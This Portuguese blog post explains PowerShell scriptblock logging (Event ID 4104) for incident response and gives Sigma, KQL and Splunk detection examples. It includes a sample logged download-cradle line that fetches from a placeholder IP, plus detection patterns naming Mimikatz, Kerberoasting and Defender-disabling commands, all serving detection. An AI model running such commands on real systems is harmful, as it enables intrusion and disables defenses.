---
title: "PowerShell Event ID 4104 explicado: scriptblock logging para DFIR"
description: "Scriptblock logging é o controle defensivo gratuito mais útil do Windows. Ele registra o corpo completo de todo script — incluindo ofuscados ou em memória — sob o event 4104."
date: "2026-05-17"
---

Quando o scriptblock logging do PowerShell está habilitado, o engine registra o corpo de todo script que executa — comandos interativos, scripts carregados do disco e qualquer coisa refletida em memória por `Invoke-Expression` ou `IEX`. O registro cai no [canal](/pt/blog/what-is-an-evtx-file) `Microsoft-Windows-PowerShell/Operational` como event ID **4104**, "Creating Scriptblock text".

## O que você ganha

```xml
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">$wc = New-Object Net.WebClient; $wc.DownloadString('http://203.0.113.5/a')</Data>
<Data Name="ScriptBlockId">{guid}</Data>
<Data Name="Path">C:\Users\alice\Downloads\setup.ps1</Data>
```

Para um script longo o PowerShell divide entre múltiplos registros 4104 (um por message number). Juntá-los de volta é essencial — fragmentos são fáceis de interpretar mal.

## Como ligar

A configuração é `HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1`, equivalente à Group Policy em *Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on PowerShell Script Block Logging*. Não há custo do lado do PowerShell que valha medir — ligue em todos os lugares.

## O que ele pega que nada mais pega

O engine do PowerShell registra o script **depois** de qualquer encoding, compressão ou reflexão em memória. Isso significa:

- Uma invocação `-EncodedCommand` registra tanto o launcher encodado (no ProcessCreate / 4688 correspondente) quanto o corpo decodificado (em 4104).
- Um script que baixa e faz `Invoke-Expression` de um payload remoto registra o corpo *executado*, não o wrapper.
- Um atacante usando bypasses de AMSI ainda deixa o registro 4104 — o bypass afeta scanning, não logging.

Este é o controle defensivo gratuito mais útil da plataforma. Defensores que não têm EDR normalmente têm isso.

## Triando 4104 em escala

Os padrões de alto sinal em um corpus de registros 4104:

- `DownloadString`, `DownloadFile`, `Invoke-WebRequest`, `Net.WebClient` — fetch remoto de conteúdo.
- `IEX`, `Invoke-Expression` — execução dinâmica.
- `FromBase64String`, `[System.Convert]::FromBase64String` — payload encodado.
- `Add-MpPreference -ExclusionPath` — tampering do Defender.
- `Set-MpPreference -DisableRealtimeMonitoring` — tampering do Defender.
- `[System.Reflection.Assembly]::Load`, `[Reflection.Emit]` — carregamento de assembly em memória.
- `Invoke-Mimikatz`, `Invoke-Kerberoast`, `Invoke-BloodHound` — ferramental ofensivo conhecido.

Um único match sozinho nem sempre é malicioso (admins também usam `DownloadString`), mas as combinações são. Pivote do 4104 para o [Sysmon event 1](/pt/blog/sysmon-event-id-1-process-create) / 4688 correspondente por timestamp + processo para recuperar o contexto de invocação completo.

## Exemplo de regra Sigma — ferramental PowerShell ofensivo em scriptblock

```yaml
title: Suspicious PowerShell Scriptblock — Offensive Tool Indicators
id: 4f1a3b8d-2c5e-4d8f-9a3b-1c2d3e4f5a6b
status: stable
description: PowerShell scriptblock body contains strings characteristic of offensive tooling, encoded payloads, or in-memory reflection.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1027/
logsource:
  product: windows
  service: powershell
  category: ps_script
detection:
  selection_offensive:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Invoke-Mimikatz'
      - 'Invoke-Kerberoast'
      - 'Invoke-BloodHound'
      - 'Invoke-DCSync'
      - 'New-PSInjection'
      - 'Get-PassHashes'
  selection_reflective:
    EventID: 4104
    ScriptBlockText|contains:
      - 'System.Reflection.Assembly]::Load'
      - '[Reflection.Emit]'
      - 'FromBase64String'
  selection_defender_tamper:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Set-MpPreference -DisableRealtimeMonitoring'
      - 'Add-MpPreference -ExclusionPath'
      - 'Set-MpPreference -DisableIOAVProtection'
  condition: selection_offensive or selection_reflective or selection_defender_tamper
falsepositives:
  - Defenders running known offensive tooling for testing (whitelist by host)
  - Software installers using reflection for legitimate purposes
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
```

## Exemplo de KQL — PowerShell encodado de um usuário low-priv

```kusto
let encoded =
    Event
    | where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
    | extend XmlData = parse_xml(EventData)
    | extend ScriptBlockText = tostring(XmlData.EventData.Data[2])
    | where ScriptBlockText contains "FromBase64String"
       or ScriptBlockText matches regex @"\b-e(?:nc|ncodedcommand)?\b\s"
    | project TimeGenerated, Computer, UserId=tostring(XmlData.System.Security["@UserID"]), ScriptBlockText;
encoded
| where UserId !startswith "S-1-5-18"   // exclude LocalSystem
   and UserId !startswith "S-1-5-19"
   and UserId !startswith "S-1-5-20"
| order by TimeGenerated desc
```

## Exemplo de Splunk — tamper do Defender via PowerShell

```spl
index=powershell EventCode=4104
   ( ScriptBlockText="*Set-MpPreference*DisableRealtimeMonitoring*"
     OR ScriptBlockText="*Add-MpPreference*ExclusionPath*"
     OR ScriptBlockText="*Set-MpPreference*DisableIOAVProtection*" )
| table _time host UserID ScriptBlockText
```

## Mapeamento ATT&CK

- **T1059.001 — Command and Scripting Interpreter: PowerShell**: todo 4104 ofensivo mapeia aqui. PowerShell é uma das técnicas de execução mais citadas em intrusões modernas.
- **T1027 — Obfuscated Files or Information**: padrões encoded / Base64 / `FromBase64String`.
- **T1059.001 + T1140 — Deobfuscate/Decode Files or Information**: o engine registra a forma *decodificada*, que é o valor que 4104 fornece sobre [4688](/pt/blog/event-id-4688-process-creation).
- **T1562.001 — Impair Defenses: Disable or Modify Tools**: `Set-MpPreference -DisableRealtimeMonitoring`, `Add-MpPreference -ExclusionPath`.
- **T1003.001 — OS Credential Dumping: LSASS Memory**: padrões `Invoke-Mimikatz`, `MiniDump`, `comsvcs.dll` em corpos de script.
- **T1558.003 — Kerberoasting**: padrões `Invoke-Kerberoast`, `Rubeus kerberoast`.

## Falsos positivos que parecem exatamente ataques

- **Runbooks de admin** às vezes usam `Invoke-Expression` legitimamente para configuração templated. A combinação geralmente é curta, repetível e de sessões de admin conhecidas.
- **Scripts de gestão do Defender** (TI corporativa) chamam `Set-MpPreference` legitimamente para empurrar listas de exclusão. Whitelist pelo certificado de assinatura do script ou SID do host.
- **Chocolatey / WinGet / instaladores de pacote** usam PowerShell Base64-encoded legitimamente. Padrão: curto, diurno, de hosts de build/admin.
- **Atividade red-team / pentest** se parecerá idêntica a ataques reais. Coordene janelas de engajamento e marque os IPs de origem do operador.

## O blind spot

4104 registra o *corpo* do script. Não registra execução por declaração, returns de função ou valores de variável. Para isso você precisa de transcrição (event 4103, "Module logging") ou um EDR real. 4104 te diz o que rodou; o resto te diz o que ele fez.
